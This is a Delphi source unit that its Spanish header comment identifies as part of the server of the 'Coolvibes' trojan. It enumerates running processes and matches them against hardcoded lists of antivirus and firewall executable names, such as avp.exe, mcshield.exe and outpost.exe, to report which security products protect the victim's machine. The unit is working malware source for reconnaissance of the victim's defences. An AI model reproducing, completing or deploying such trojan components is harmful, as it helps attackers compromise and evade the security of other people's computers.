{Unit perteneciente al server del troyano Coolvibes que contiene funciones para
detectar que antivirus y firewall se usa en el sistema}
unit unitAvs;

interface

uses
  UnitProcess;

const TH32CS_SNAPPROCESS = $00000002;
const PROCESS_ALL_ACCESS = $001F0FFF;
const STATUS_SUCCESS = $00000000;

const
  Procesos:        array[0..15] of String = ('avguard.exe',
                                             'ashdisp.exe',
                                             'avgcc.exe',
                                             'bdss.exe',
                                             'spider.exe',
                                             'avp.exe',
                                             'ekrn.exe',
                                             'cclaw.exe',
                                             'dvpapi.exe',
                                             'ewidoctrl.exe',
                                             'mcshield.exe',
                                             'pavfires.exe',
                                             'almon.exe',
                                             'ccapp.exe',
                                             'pccntmon.exe',
                                             'fssm32.exe');
  NombreDeAntivirus: array[0..15] of String =('AntiVir',
                                             'Avast Antivirus',
                                             'AVG Antivirus',
                                             'BitDefender',
                                             'Dr.Web',
                                             'Kaspersky Antivirus',
                                             'Nod32',
                                             'Norman',
                                             'Authentium Antivirus',
                                             'Ewido Security Suite',
                                             'McAfee VirusScan',
                                             'Panda Antivirus/Firewall',
                                             'Sophos',
                                             'Symantec/Norton',
                                             'PC-cillin Antivirus',
                                             'F-Secure');

  Firewalls:      array[0..14] of String =  ('issvc.exe',
                                             'vsmon.exe',
                                             'cpf.exe',
                                             'ca.exe',
                                             'tnbutil.exe',
                                             'avp.exe',
                                             'mpfservice.exe',
                                             'npfmsg.exe',
                                             'outpost.exe',
                                             'tpsrv.exe',
                                             'pavfires.exe',
                                             'kpf4ss.exe',
                                             'persfw.exe',
                                             'vsserv.exe',
                                             'smc.exe');
  NombreDeFirewall: array[0..14] Of string =('Norton Personal Firewall',
                                             'ZoneAlarm',
                                             'Comodo Firewall',
                                             'eTrust EZ Firewall',
                                             'F-Secure Internet Security',
                                             'Kaspersky Antihacker',
                                             'McAfee Personal Firewall',
                                             'Norman Personal Firewall',
                                             'Outpost Personal Firewall',
                                             'Panda Internet Seciruty Suite',
                                             'Panda Anti-Virus/Firewall',
                                             'Kerio Personal Firewall',
                                             'Tiny Personal Firewall',
                                             'BitDefender / Bull Guard Antivirus',
                                             'Sygate Personal Firewall');

  function ObtenerAvs(): String;
  function ObtenerFirewall(): String;
  function Scan(Tipo: integer): String;

implementation

function CreateToolhelp32Snapshot (dwFlags:Cardinal; th32ProcessID: Cardinal) : Cardinal ; stdcall; external 'kernel32.dll' name 'CreateToolhelp32Snapshot';
function Process32First (hSnapshot: Cardinal; var lppe: TProcessEntry32): LongBOOL ; stdcall; external 'kernel32.dll' name 'Process32First';
function Process32Next (hSnapshot: Cardinal; var lpme: TPROCESSENTRY32): LongBOOL ; stdcall; external 'kernel32.dll' name 'Process32Next';
function CloseHandle (hObject:Cardinal):Boolean;stdcall;external 'kernel32' name 'CloseHandle';
function lstrcmpi (lpString1: PAnsiChar; lpString2:PAnsiChar):Integer;stdcall;external 'kernel32' name 'lstrcmpiA';

function ObtenerAvs(): String;
begin
  Result := Scan(1);
end;

function ObtenerFirewall(): String;
begin
  Result := Scan(2);
end;

Function Scan(tipo: integer): String;
var
  cLoop     :Boolean;
  CapProcesos:THandle;
  L         :TProcessEntry32;
  i         :integer;
Begin
  Result := 'No encontrado';
  CapProcesos := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  L.dwSize := SizeOf(L);
  cLoop := Process32First(CapProcesos, L);
  while cLoop do
  begin
    if tipo = 1 then
      for i := 0 to 15 do
        if lstrcmpi(L.szExeFile, PChar(Procesos[i])) = 0 then
          Result := NombreDeAntivirus[i];
    if tipo = 2 then
      for i := 0 to 14 do
        if lstrcmpi(L.szExeFile,PChar(Firewalls[i])) = 0 then
          Result := NombreDeFirewall[i];
    cLoop := Process32Next(CapProcesos, L);
  end;
  CloseHandle(CapProcesos);
end;

end.
